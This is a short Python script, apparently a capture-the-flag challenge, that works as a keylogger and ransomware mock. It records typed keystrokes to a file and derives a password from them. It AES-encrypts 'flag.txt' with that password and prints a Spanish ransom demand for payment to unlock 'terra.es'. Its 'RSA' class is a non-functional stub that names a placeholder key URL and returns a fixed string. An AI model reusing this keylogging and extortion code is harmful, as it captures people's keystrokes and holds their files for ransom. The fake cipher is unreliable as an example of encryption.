import pyAesCrypt
from base64 import b64encode
import os
import keyboard
import urllib.request


class RSA_Cipher:
  def get_key(self,key):
    url = 'http://dominiochuliperonoexiste.tv/public.pem'
    pass1 = requestt(url)
    

  def encrypt(self,data):
    plaintext = b64encode(data.encode())
    
    ciphertext = "aase34"
    ciphertext = ciphertext * 10
    return b64encode(ciphertext.encode())

def requestt(url):
    return url

if __name__ == '__main__':

    FILE_NAME = "letters.txt"
    password=""
    CLEAR_ON_STARTUP = False
    TERMINATE_LETTER = "v"
    salt = "salt"
    if CLEAR_ON_STARTUP:
        os.remove(FILE_NAME)
    output = open(FILE_NAME, "a")
    for string in keyboard.get_typed_strings(keyboard.record(TERMINATE_LETTER)):
        output.write(string + "\n")
    output.close()
    bufferSize = 64 * 1024
    with open('letters.txt', 'r') as f:
        lines = f.read().splitlines()
        last_line = lines[-1]
    if TERMINATE_LETTER in last_line:
        if len(last_line) >=3:
            a = last_line.split(' ')
            password = a[-3] + salt + a[-2]
                
    pyAesCrypt.encryptFile("flag.txt", "flag_.txt.aes", password, bufferSize)
    cipher = RSA_Cipher()
    key="k19nal"
    cipher.get_key(key)
    encrypted=cipher.encrypt(key)
    print ("Amigo, si quieres desbloquear terra.es tendrás que pagarnos un dinerito enviandonos el siguiente texto: \n")
    print (encrypted)
    
   
